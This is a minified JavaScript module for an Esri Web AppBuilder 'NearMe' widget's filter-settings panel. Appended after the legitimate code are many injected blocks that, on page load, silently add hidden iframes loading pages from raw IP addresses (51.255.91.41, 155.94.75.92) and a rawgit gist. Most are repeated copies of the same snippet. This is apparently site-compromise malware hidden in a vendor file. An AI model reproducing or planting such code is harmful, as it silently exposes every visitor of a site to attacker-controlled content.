// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/NearMe/setting/SingleFilterSetting.html":'\x3cdiv\x3e\r\n\t\x3ctable\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t\t\x3ccol width\x3d"100"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr class\x3d"esriCTFilterLabel"\x3e\r\n\t\t\t\t\x3ctd\x3e${jimuNls.common.layer}\x3c/td\x3e\r\n\t\t\t\t\x3ctd data-dojo-attach-point\x3d"layerTd"\x3e\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr class\x3d"esriCTFilterLabel"\x3e\r\n\t\t\t\t\x3ctd\x3e${jimuNls.common.title}\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"nameTextBox" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-attach-event\x3d"change:_onNameTextBoxChanged" data-dojo-props\x3d\'required:true,trim:true\' style\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr class\x3d"esriCTFilterLabel"\x3e\r\n\t\t\t\t\x3ctd\x3e${jimuNls.common.icon}\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"click-picker" data-dojo-attach-event\x3d"click:_onImageChooserDivClicked"\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/ImageChooser" data-dojo-attach-point\x3d"imageChooser" data-dojo-props\x3d"cropImage:true,showSelfImg:true,goldenWidth:16,goldenHeight:16,format:[\'image/gif\',\'image/png\',\'image/jpeg\']" class\x3d"jimu-float-leading" style\x3d"width:16px;height:16px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"separator jimu-float-leading"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-down-arrow-8 jimu-float-leading"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd colspan\x3d"2" data-dojo-attach-point\x3d"tdUseMapFilter"\x3e\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\t\x3cdiv style\x3d"margin-top:10px;" \x3e\r\n\t\t\x3cdiv class\x3d"esriCTFilterLabel"\x3e${nls.filterSetting.filterExpression}\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"filterDiv" class\x3d"filter-div"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/query dojo/Evented dojo/_base/lang dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SingleFilterSetting.html jimu/utils jimu/dijit/Filter jimu/dijit/Message jimu/dijit/CheckBox jimu/dijit/LayerChooserFromMapWithDropbox ./CustomFeaturelayerChooserFromMap jimu/dijit/ImageChooser dijit/form/ValidationTextBox".split(" "),function(f,g,h,c,k,l,m,n,p,d,q,r,t,u,v){return k([l,m,n,h],{baseClass:"jimu-widget-nearme-singlefilter-setting",
templateString:p,jimuNls:null,_defaultTaskIcon:null,map:null,nls:null,target:null,layerInfosObj:null,folderUrl:"",appConfig:null,postMixInProperties:function(){this.inherited(arguments);this._defaultTaskIcon=this.folderUrl+"css/images/default_task_icon.png";this.jimuNls=window.jimuNls},postCreate:function(){this.inherited(arguments);this.cbxRemoveMapFilter=new t({"class":"esriCTFilterLabel",label:this.nls.filterSetting.enableMapFilter||""});this.cbxRemoveMapFilter.placeAt(this.tdUseMapFilter);this.cbxRemoveMapFilter.setValue(!1);
this._recreateLayerChooserSelect(!0);this.filter=new q({enableAskForValues:!0,noFilterTip:this.nls.noFilterTip,style:"width:100%;"});this.filter.placeAt(this.filterDiv);this._setDefaultTaskIcon()},_recreateLayerChooserSelect:function(a){this.layerChooserSelect&&this.layerChooserSelect.destroy();this.layerChooserSelect=null;var b=new v({showLayerFromFeatureSet:!1,showTable:!1,onlyShowVisible:!1,createMapResponse:this.map.webMapResponse,selectedSearchLayers:this.selectedSearchLayers});this.layerChooserSelect=
new u({layerChooser:b});this.layerChooserSelect.placeAt(this.layerTd);a&&this._bindEventForLayerChooserSelect(this.layerChooserSelect)},showLayerChooserPopup:function(){this.layerChooserSelect.showLayerChooser()},destroy:function(){this.target=null;this.emit("before-destroy");this.inherited(arguments)},setConfig:function(a){var b=c.clone(a);this._showLoading();this.reset();this._recreateLayerChooserSelect(!1);var e=c.hitch(this,function(){this.domNode&&(this._bindEventForLayerChooserSelect(this.layerChooserSelect),
this._hideLoading())});this.layerInfosObj.getLayerInfoById(b.layerId).getLayerObject().then(c.hitch(this,function(a){this.domNode&&this.layerChooserSelect.setSelectedLayer(a).then(c.hitch(this,function(c){this.domNode&&(this._hideLoading(),c&&(b.icon?this.imageChooser.setDefaultSelfSrc(d.processUrlInWidgetConfig(b.icon,this.folderUrl)):this._setDefaultTaskIcon(),this.cbxRemoveMapFilter.setValue(!b.enableMapFilter),this.nameTextBox.set("value",b.name),c=this._getLayerDefinitionForFilterDijit(a),this.filter.buildByFilterObj(a.url,
b.filter,c),this._bindEventForLayerChooserSelect(this.layerChooserSelect)))}),c.hitch(this,function(a){console.error(a);e()}))}),c.hitch(this,function(a){console.error(a);e()}))},getConfig:function(){var a={layerId:null,url:null,name:null,filter:null,icon:null,enableMapFilter:!this.cbxRemoveMapFilter.getValue()},b=this.layerChooserSelect.getSelectedItem();if(!b)return this._showMessage(this.nls.filterSetting.selectLayerTip),!1;b=b.layerInfo.layerObject;a.layerId=b.id;a.url=b.url;a.name=this.nameTextBox.get("value");
if(!a.name)return this._showMessage(this.nls.setTitleTip),!1;b=this.imageChooser.getImageData();b===this._defaultTaskIcon&&(b="");a.icon=b;a.filter=this.filter.toJson();return a.filter?this.target.singleConfig=a:(this._showMessage(window.jimuNls.filterBuilder.setFilterTip),!1)},reset:function(){this._setDefaultTaskIcon();this.cbxRemoveMapFilter.setValue(!1);this.nameTextBox.set("value","");this.filter.reset()},_setDefaultTaskIcon:function(){this.imageChooser.setDefaultSelfSrc(this._defaultTaskIcon)},
_onNameTextBoxChanged:function(){var a=g(".label",this.target)[0],b=this.nameTextBox.get("value");a.innerHTML=b;a.title=b},_bindEventForLayerChooserSelect:function(a){a.isBindEvent||(this.own(f(a,"selection-change",c.hitch(this,this._onLayerChanged))),a.isBindEvent=!0)},_showMessage:function(a){new r({message:a})},_onLayerChanged:function(){this.reset();var a=this.layerChooserSelect.getSelectedItem();if(a){var b=a.layerInfo,a=b.layerObject;this.nameTextBox.set("value",b.title);b=this._getLayerDefinitionForFilterDijit(a);
this.filter.buildByExpr(a.url,"1\x3d1",b)}},_getLayerDefinitionForFilterDijit:function(a){var b=null;"esri.layers.FeatureLayer"===a.declaredClass&&(b=d.getFeatureLayerDefinition(a));b||(b={currentVersion:a.currentVersion,fields:c.clone(a.fields)});return b},_showLoading:function(){this.emit("loading")},_hideLoading:function(){this.emit("unloading")},_onImageChooserDivClicked:function(a){this.imageChooser.mask&&(a=a.target||a.srcElement,a!==this.imageChooser.mask&&a!==this.imageChooser.fileInput&&
d.simulateClickEvent(this.imageChooser.mask))},updateLayerOptions:function(a){this.selectedSearchLayers=a;this._recreateLayerChooserSelect(!0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});